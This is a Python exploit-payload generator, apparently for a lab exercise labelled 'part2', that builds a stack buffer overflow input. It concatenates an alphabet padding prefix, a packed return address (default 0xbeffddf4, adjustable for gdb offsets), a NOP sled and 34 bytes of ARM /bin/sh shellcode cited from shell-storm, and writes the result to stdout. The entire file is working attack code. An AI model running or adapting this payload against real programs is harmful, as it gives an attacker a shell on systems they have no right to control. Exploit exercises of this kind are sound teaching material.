#!/usr/bin/env python3
import argparse
import struct
import sys


alpha = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

nop = b"\x00"

# /bin/sh 34-bytes
# http://shell-storm.org/shellcode/files/shellcode-904.php
sc = b"\x01\x30\x8f\xe2"
sc += b"\x13\xff\x2f\xe1"
sc += b"\x78\x46\x0e\x30"
sc += b"\x01\x90\x49\x1a"
sc += b"\x92\x1a\x08\x27"
sc += b"\xc2\x51\x03\x37"
sc += b"\x01\xdf\x2f\x62"
sc += b"\x69\x6e\x2f\x2f"
sc += b"\x73\x68"


def main():
    parser = argparse.ArgumentParser(description='part2')
    parser.add_argument("--ret_pc", type=str, default="0xbeffddf4",
                        help="return addr to be overwritten.")
    parser.add_argument("--gdb_offset", type=int, default=0,
                        help="gdb offset.")
    parser.add_argument("--prefixlen", type=int, default=24,
                        help="the length of prefix paylod before reaching ret addr.")
    parser.add_argument("--nop_len", type=int, default=100,
                        help="the length of NOPs.")

    args = parser.parse_args()

    prefix = alpha[:args.prefixlen].encode()
    ret_pc = int(args.ret_pc, 16)  # ret pc position.
    gdb_offset = args.gdb_offset
    nop_len = args.nop_len

    ret_pc_packed = struct.pack("<I", ret_pc + gdb_offset)

    # import pdb
    # pdb.set_trace()
    print("prefix len: {}".format(args.prefixlen), file=sys.stderr)
    print("ret PC: {}".format(args.ret_pc), file=sys.stderr)
    print("gdb_offset: {}".format(args.gdb_offset), file=sys.stderr)
    print("nop_len: {}".format(args.nop_len), file=sys.stderr)

    # print() takes unicode text and encodes that to an encoding suitable
    # for your terminal.
    payload = prefix + ret_pc_packed + nop * nop_len + sc
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()

